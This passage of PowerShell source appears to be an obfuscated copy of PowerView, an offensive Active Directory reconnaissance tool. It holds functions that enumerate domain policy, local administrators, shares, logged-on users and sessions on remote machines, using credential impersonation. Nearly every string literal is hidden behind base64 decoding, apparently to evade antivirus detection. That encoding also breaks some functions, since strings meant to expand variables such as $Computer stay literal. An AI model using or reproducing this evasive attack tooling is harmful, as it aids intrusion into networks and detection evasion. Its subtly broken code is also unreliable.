                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer.dnshostname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) $Object.samaccountname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $Object.distinguishedname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $_
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $IsGroup
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPOGroup.GPODisplayName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPR3VpZA=="))) $GPOGroup.GPOName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) $GPOGroup.GPOPath
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPVHlwZQ=="))) $GPOGroup.GPOType
                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlcg=="))))
                        $GPOComputerLocalGroupMember
                    }
                }
            }
        }
    }
}


function Get-DomainPolicyData {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $Policy = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))),

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain
            $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain
        }

        if ($Policy -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs")))) {
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))
        }
        elseif ($Policy -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))) {
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezMxQjJGMzQwLTAxNkQtMTFEMi05NDVGLTAwQzA0RkI5ODRGOX0=")))
        }
        elseif (($Policy -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluQ29udHJvbGxlcg==")))) -or ($Policy -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM="))))) {
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezZBQzE3ODZDLTAxNkYtMTFEMi05NDVGLTAwQzA0RkI5ODRGOX0=")))
        }
        else {
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Policy
        }

        $GPOResults = Get-DomainGPO @SearcherArguments

        ForEach ($GPO in $GPOResults) {
            
            $GptTmplPath = $GPO.gpcfilesyspath + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XE1BQ0hJTkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU2VjRWRpdFxHcHRUbXBsLmluZg==")))

            $ParseArgs =  @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3B0VG1wbFBhdGg="))) = $GptTmplPath
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0T2JqZWN0"))) = $True
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ParseArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

            
            Get-GptTmpl @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPTmFtZQ=="))) $GPO.name
                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPO.displayname
                $_
            }
        }
    }
}










function Get-NetLocalGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ"))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ")))) {
                

                
                $QueryLevel = 1
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                
                $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                
                $Offset = $PtrInfo.ToInt64()

                
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    
                    $Increment = $LOCALGROUP_INFO_1::GetSize()

                    
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                        $LocalGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $Info.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tbWVudA=="))) $Info.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkxvY2FsR3JvdXAuQVBJ"))))
                        $LocalGroup
                    }
                    
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                }
                else {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRMb2NhbEdyb3VwXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $Result).Message))
                }
            }
            else {
                
                $ComputerProvider = [ADSI]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTlQ6Ly8kQ29tcHV0ZXIsY29tcHV0ZXI=")))

                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA="))) } | ForEach-Object {
                    $LocalGroup = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                    $Group | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) ($LocalGroup.InvokeGet(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))))
                    $Group | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0lE"))) ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0c2lk")))),0)).Value)
                    $Group | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tbWVudA=="))) ($LocalGroup.InvokeGet(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVzY3JpcHRpb24=")))))
                    $Group.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkxvY2FsR3JvdXAuV2luTlQ="))))
                    $Group
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLocalGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM="))),

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ"))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ")))) {
                

                
                $QueryLevel = 2
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                
                $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                
                $Offset = $PtrInfo.ToInt64()

                $Members = @()

                
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    
                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()

                    
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $SidString = ''
                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRMb2NhbEdyb3VwTWVtYmVyXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
                        }
                        else {
                            $Member = New-Object PSObject
                            $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                            $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
                            $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyTmFtZQ=="))) $Info.lgrmi2_domainandname
                            $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0lE"))) $SidString
                            $IsGroup = $($Info.lgrmi2_sidusage -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2lkVHlwZUdyb3Vw"))))
                            $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $IsGroup
                            $Member.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkxvY2FsR3JvdXBNZW1iZXIuQVBJ"))))
                            $Members += $Member
                        }
                    }

                    
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)

                    
                    $MachineSid = $Members | Where-Object {$_.SID -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LiotNTAw"))) -or ($_.SID -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LiotNTAx"))))} | Select-Object -Expand SID
                    if ($MachineSid) {
                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))))

                        $Members | ForEach-Object {
                            if ($_.SID -match $MachineSid) {
                                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNEb21haW4="))) $False
                            }
                            else {
                                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNEb21haW4="))) $True
                            }
                        }
                    }
                    else {
                        $Members | ForEach-Object {
                            if ($_.SID -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMjE=")))) {
                                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNEb21haW4="))) $False
                            }
                            else {
                                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNEb21haW4="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))
                            }
                        }
                    }
                    $Members
                }
                else {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRMb2NhbEdyb3VwTWVtYmVyXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $Result).Message))
                }
            }
            else {
                
                try {
                    $GroupProvider = [ADSI]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTlQ6Ly8kQ29tcHV0ZXIvJEdyb3VwTmFtZSxncm91cA==")))

                    $GroupProvider.psbase.Invoke(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVycw==")))) | ForEach-Object {

                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName

                        $LocalUser = ([ADSI]$_)
                        $AdsPath = $LocalUser.InvokeGet(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRzUGF0aA==")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTlQ6Ly8="))), '')
                        $IsGroup = ($LocalUser.SchemaClassName -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA="))))

                        if(([regex]::Matches($AdsPath, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))).count -eq 1) {
                            
                            $MemberIsDomain = $True
                            $Name = $AdsPath.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
                        }
                        else {
                            
                            $MemberIsDomain = $False
                            $Name = $AdsPath.Substring($AdsPath.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))+1).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
                        }

                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNjb3VudE5hbWU="))) $Name
                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0lE"))) ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE")))),0)).Value)
                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $IsGroup
                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNEb21haW4="))) $MemberIsDomain

                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        $Member
                    }
                }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRMb2NhbEdyb3VwTWVtYmVyXSBFcnJvciBmb3IgJENvbXB1dGVyIDogezB9"))) -f $_)
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetShare {


    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            
            $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            
            $Offset = $PtrInfo.ToInt64()

            
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                
                $Increment = $SHARE_INFO_1::GetSize()

                
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SHARE_INFO_1

                    
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                    $Share.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlNoYXJlSW5mbw=="))))
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Share
                }

                
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRTaGFyZV0gRXJyb3I6IHswfQ=="))) -f $(([ComponentModel.Win32Exception] $Result).Message))
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLoggedon {


    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            
            $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            
            $Offset = $PtrInfo.ToInt64()

            
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                
                $Increment = $WKSTA_USER_INFO_1::GetSize()

                
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WKSTA_USER_INFO_1

                    
                    $LoggedOn = $Info | Select-Object *
                    $LoggedOn | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                    $LoggedOn.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkxvZ2dlZE9uVXNlckluZm8="))))
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $LoggedOn
                }

                
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRMb2dnZWRvbl0gRXJyb3I6IHswfQ=="))) -f $(([ComponentModel.Win32Exception] $Result).Message))
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetSession {


    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $QueryLevel = 10
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            
            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            
            $Offset = $PtrInfo.ToInt64()

            
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                
                $Increment = $SESSION_INFO_10::GetSize()

                
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SESSION_INFO_10

                    
                    $Session = $Info | Select-Object *
                    $Session | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                    $Session.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlNlc3Npb25JbmZv"))))
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Session
                }

                
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRTZXNzaW9uXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $Result).Message))
            }
        }
    }


    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-RegLoggedOn {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0")))
    )

    BEGIN {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcnM="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JENvbXB1dGVyTmFtZQ=="))))

                
                $Reg.GetSubKeyNames() | Where-Object { $_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJA=="))) } | ForEach-Object {
                    $UserName = ConvertFrom-SID -ObjectSID $_ -OutputType ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluU2ltcGxl")))

                    if ($UserName) {
